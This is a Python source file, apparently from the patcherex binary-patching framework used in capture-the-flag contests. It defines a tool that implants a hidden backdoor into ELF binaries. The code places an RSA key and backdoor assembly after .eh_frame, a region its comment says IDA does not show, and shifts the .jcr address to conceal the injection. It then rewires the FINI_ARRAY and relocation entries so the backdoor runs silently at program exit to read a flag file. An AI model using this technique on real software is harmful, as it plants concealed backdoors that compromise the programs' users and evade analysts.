import struct
import pwn

import patcherex
import angr

import capstone
import logging
from patcherex.patches import *
from patcherex.backends.patchkitdetourbackend import PatchkitDetourBackend
from patcherex.backends.patchkit.core.util.elffile import DT, ElfClass
from patcherex.backends.patchkit.core.arch import x86, x86_PIE, x86_64, x86_64_PIE
from patcherex.backends.patchkit.core.util.rsa import rsa

l = logging.getLogger("patcherex.techniques.patchkit.FiniBackdoor")

class FiniBackdoor(object):
    # XXX: Please fix this name
    FINI_BACKDOOR_RSA = 0
    FINI_BACKDOOR_CHECKSUM = 1
    FINI_BACKDOOR_XXX = 2
    FINI_BACKDOOR_NONEAN = 3

    def __init__(self, binary_path, backend, flag_path="./flag", ):
        self.flag_path = flag_path
        self.binary_path = binary_path
        self.patcher = backend
        self._arch_info = self._get_arch_info()
        # TODO: Support for other backend
        assert(isinstance(backend, PatchkitDetourBackend))

    def get_patches(self):
        patches = []
        # patches.append(AddRODataPatch(rsa.raw_n(), "rsa_n"))

        # TODO: Move to .eh_frame
        # patches.append(AddCodePatch(
        #     self.patcher.arch.call_backdoor(self.flag_path, "rsa_n"),
        #     name="fini_backdoor"))
        return patches

    def _get_arch_info(self):
        if self.patcher.project.arch.bytes == 8:
            return {
                'nbytes': 8,
                'pack': pwn.p64,
                'unpack': pwn.u64,
                'dyn_name': '.rela.dyn',
                'entsize': 8 * 3,
                'mask_bit': 32
            }

        else:
            assert(self.patcher.project.arch.bytes == 4)
            return {
                'nbytes': 4,
                'pack': pwn.p32,
                'unpack': pwn.u32,
                'dyn_name': '.rel.dyn',
                'entsize': 4 * 2,
                'mask_bit': 8
            }

    def _get_code_by_type(self, key_addr, backdoor_type, checksum_path):
        if backdoor_type is self.FINI_BACKDOOR_RSA:
            # Use replace since ARM code can have format like code e.g., {r0}
            code = self.patcher.arch.call_backdoor(self.flag_path, "rsa_n").replace("{rsa_n}", str(key_addr))
        elif backdoor_type is self.FINI_BACKDOOR_XXX:
            if checksum_path is None:
                # checksum file required
                raise NotImplementedError
            with open(checksum_path, "rb") as f:
                with self.patcher.binary.collect() as pt:
                    csum_addr = pt.inject(raw=f.read())
            code = self.patcher.arch.backdoor_asm(csum_addr, self.flag_path).format(
                    rsa_n=key_addr)
        elif backdoor_type is self.FINI_BACKDOOR_CHECKSUM:
            code = self.patcher.arch.checksum_asm()
        elif backdoor_type is self.FINI_BACKDOOR_NONEAN:
            code = self.patcher.arch.none_alphanumeric_backdoor(self.flag_path).replace("{rsa_n}", str(key_addr))
        else:
            raise ValueError('No such backdoor_type support')

        return code

    def post_process(self, backdoor_type, checksum_path=None):
        elf = self.patcher.binary.elf

        unpack = self._arch_info['unpack']
        pack = self._arch_info['pack']
        nbytes = self._arch_info['nbytes']

        # Currently, it puts key and code after eh_frame
        # which is not shown in IDA
        eh_frame = elf.section_by_name('.eh_frame')
        key_addr = eh_frame.addr + eh_frame.size
        key = rsa.raw_n()

        code = self._get_code_by_type(key_addr, backdoor_type, checksum_path)

        # Inject RSA key
        with self.patcher.binary.collect() as pt:
            pt.patch(key_addr, raw=key)

        code_addr = key_addr + len(key)

        # Inject code
        with self.patcher.binary.collect() as pt:
            pt.patch(code_addr, asm=code)

        dynamic =  elf.section_by_name(".dynamic")
        data = elf.read(dynamic.addr, dynamic.size)

        # Hide address shown in .jcr section
        jcr = elf.section_by_name('.jcr')
        jcr.addr += nbytes

        for i in xrange(0, len(data), nbytes * 2):
            tag = unpack(data[i:i+nbytes])
            val = unpack(data[i+nbytes:i+2*nbytes])
            if not tag in DT:
                continue
            if tag == DT['DT_FINI_ARRAYSZ']:
                assert(val == nbytes)
                l.info("Update FINI_ARRAY_SZ: %d -> %d\n" % (nbytes, nbytes * 2))
                with self.patcher.binary.collect() as pt:
                    pt.patch(dynamic.addr + i + nbytes, raw=pack(nbytes * 2))
            if tag == DT['DT_FINI_ARRAY']:
                with self.patcher.binary.collect() as pt:
                    pt.patch(val + nbytes, raw=pack(code_addr))
                new_fini_elem = val + nbytes

        if self.patcher.project.loader.main_object.pic:
            # TODO: Find better position to retrieve symbols
            # Currently, we heuristically find _dso_handle
            # that is first symbol after init + fini
            l.warn("XXX: This might not work for C++ binaries!!!")
            dyn_rel = elf.section_by_name(self._arch_info['dyn_name'])
            data = elf.read(dyn_rel.addr, dyn_rel.size)
            page = None

            entsize = self._arch_info['entsize']

            for i in xrange(0, len(data), entsize):
                off = unpack(data[i:i+nbytes])
                info = unpack(data[i+nbytes:i+nbytes*2])
                info_type = info & ((1 << self._arch_info['mask_bit']) - 1)
                # R_386_RELATIVE or R_ARM_RELATIVE
                if entsize != 24 and (info_type == 8 or info_type == 23):
                    if page is None:
                        page = off & ~(0x1000 - 1)
                    elif (off & ~(0x1000 - 1)) != page:
                        with self.patcher.binary.collect() as pt:
                            pt.patch(dyn_rel.addr + i, raw=pack(new_fini_elem))
                        break
                elif entsize == 24 and (info_type == 8 or info_type == 1027): # Elf64_Rela and info == R_X86_64_RELATIVE or info == R_AARCH64_RELATIVE
                    if page is None:
                        page = off & ~(0x1000 - 1)
                    elif (off & ~(0x1000 - 1)) != page:
                        with self.patcher.binary.collect() as pt:
                            pt.patch(dyn_rel.addr + i, raw=pack(new_fini_elem))
                            pt.patch(dyn_rel.addr + i + 16, raw=pack(code_addr)) # r_addend
                        break
